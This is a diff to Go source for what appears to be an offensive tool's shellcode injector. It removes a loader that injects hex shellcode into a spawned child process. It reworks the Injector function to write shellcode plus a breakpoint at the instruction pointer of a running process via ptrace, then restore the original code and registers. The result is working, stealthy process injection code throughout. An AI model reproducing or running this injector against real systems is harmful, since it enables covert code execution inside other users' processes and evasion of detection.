@@ -98,109 +98,9 @@ if sc_size <= mem_size:
 	return nil
 }
 
-// goShellcodeLoader pure go, using ptrace
-func goShellcodeLoader(shellcode *string) error {
-	// format
-	*shellcode = strings.Replace(*shellcode, ",", "", -1)
-	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
-	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)
-
-	// decode hex shellcode string
-	sc, err := hex.DecodeString(*shellcode)
-	if err != nil {
-		return fmt.Errorf("Decode shellcode: %v", err)
-	}
-
-	// start a child process to inject shellcode into
-	sec := strconv.Itoa(RandInt(10, 30))
-	child := exec.Command("sleep", sec)
-	child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
-	err = child.Start()
-	if err != nil {
-		return fmt.Errorf("Start `sleep 5`: %v", err)
-	}
-	childPid := child.Process.Pid
-
-	// attach
-	err = child.Wait() // TRAP the child
-	if err != nil {
-		log.Printf("child process wait: %v", err)
-	}
-	log.Printf("goShellcodeLoader: attached to %d", childPid)
-
-	// read RIP
-	regs := &syscall.PtraceRegs{}
-	err = syscall.PtraceGetRegs(childPid, regs)
-	if err != nil {
-		return fmt.Errorf("read regs from %d: %v", childPid, err)
-	}
-	rip := regs.Rip
-	log.Printf("goShellcodeLoader: got RIP (0x%x) of %d", rip, childPid)
-
-	// write shellcode to .text section, where RIP is pointing at
-	n, err := syscall.PtracePokeText(childPid, uintptr(rip), sc)
-	if err != nil {
-		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), childPid, err)
-	}
-	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)
-
-	// peek: see if shellcode has got injected
-	peekWord := make([]byte, len(sc))
-	n, err = syscall.PtracePeekText(childPid, uintptr(rip), peekWord)
-	if err != nil {
-		return fmt.Errorf("PEEK: 0x%x", rip)
-	}
-	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)
-
-	// continue and wait
-	err = syscall.PtraceCont(childPid, 0)
-	if err != nil {
-		return fmt.Errorf("Continue: %v", err)
-	}
-	var ws syscall.WaitStatus
-	_, err = syscall.Wait4(childPid, &ws, 0, nil)
-	if err != nil {
-		return fmt.Errorf("continue: wait4: %v", err)
-	}
-	// what happened to our child?
-	switch {
-	case ws.Continued():
-		return nil
-	case ws.CoreDump():
-		err = syscall.PtraceGetRegs(childPid, regs)
-		if err != nil {
-			return fmt.Errorf("read regs from %d: %v", childPid, err)
-		}
-		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
-	case ws.Exited():
-		return nil
-	case ws.Signaled():
-		err = syscall.PtraceGetRegs(childPid, regs)
-		if err != nil {
-			return fmt.Errorf("read regs from %d: %v", childPid, err)
-		}
-		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
-	case ws.Stopped():
-		err = syscall.PtraceGetRegs(childPid, regs)
-		if err != nil {
-			return fmt.Errorf("read regs from %d: %v", childPid, err)
-		}
-		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
-	default:
-		err = syscall.PtraceGetRegs(childPid, regs)
-		if err != nil {
-			return fmt.Errorf("read regs from %d: %v", childPid, err)
-		}
-		log.Printf("continue: RIP at 0x%x", regs.Rip)
-	}
-
-	return nil
-}
-
-// Injector inject shellcode to a running process using ptrace
 // target process will be restored after shellcode has done its job
 // TODO
-func Injector(pid int, shellcode *string) error {
+func Injector(shellcode *string, pid int) error {
 	// format
 	*shellcode = strings.Replace(*shellcode, ",", "", -1)
 	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
@@ -246,23 +146,36 @@ func Injector(pid int, shellcode *string) error {
 	if err != nil {
 		return fmt.Errorf("read regs from %d: %v", pid, err)
 	}
-	rip := regs.Rip
-	log.Printf("Injector: got RIP (0x%x) of %d", rip, pid)
+	origRip := regs.Rip
+	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
+
+	// save current code for restoring later
+	origCode := make([]byte, len(sc)+1)
+	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
+	if err != nil {
+		return fmt.Errorf("PEEK: 0x%x", origRip)
+	}
+	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
 
 	// write shellcode to .text section, where RIP is pointing at
-	n, err := syscall.PtracePokeText(pid, uintptr(rip), sc)
+	bp, err := hex.DecodeString("cc")
 	if err != nil {
-		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), pid, err)
+		return fmt.Errorf("bp decode")
 	}
-	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)
+	data := append(sc, bp...)
+	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
+	if err != nil {
+		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+	}
+	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)
 
 	// peek: see if shellcode has got injected
-	peekWord := make([]byte, len(sc))
-	n, err = syscall.PtracePeekText(pid, uintptr(rip), peekWord)
+	peekWord := make([]byte, len(data))
+	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
 	if err != nil {
-		return fmt.Errorf("PEEK: 0x%x", rip)
+		return fmt.Errorf("PEEK: 0x%x", origRip)
 	}
-	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)
+	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, origRip)
 
 	// continue and wait
 	err = syscall.PtraceCont(pid, 0)
@@ -292,7 +205,32 @@ func Injector(pid int, shellcode *string) error {
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+		log.Printf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+
+		// breakpoint hit, restore the process
+		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
+		if err != nil {
+			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+		}
+		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
+
+		// restore registers
+		err = syscall.PtraceSetRegs(pid, regs)
+		if err != nil {
+			return fmt.Errorf("Restoring process: set regs: %v", err)
+		}
+
+		// continue and wait
+		err = syscall.PtraceCont(pid, 0)
+		if err != nil {
+			return fmt.Errorf("Continue: %v", err)
+		}
+		_, err = syscall.Wait4(pid, &ws, 0, nil)
+		if err != nil {
+			return fmt.Errorf("continue: wait4: %v", err)
+		}
+
+		return nil
 	case ws.Stopped():
 		err = syscall.PtraceGetRegs(pid, regs)
 		if err != nil {
@@ -330,7 +268,7 @@ func InjectShellcode(pid int, method string) (err error) {
 	case "gdb":
 		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
 	case "native":
-		err = goShellcodeLoader(&shellcode)
+		err = Injector(&shellcode, pid)
 	case "python":
 		err = pyShellcodeLoader(&shellcode, shellcodeLen)
 	default:
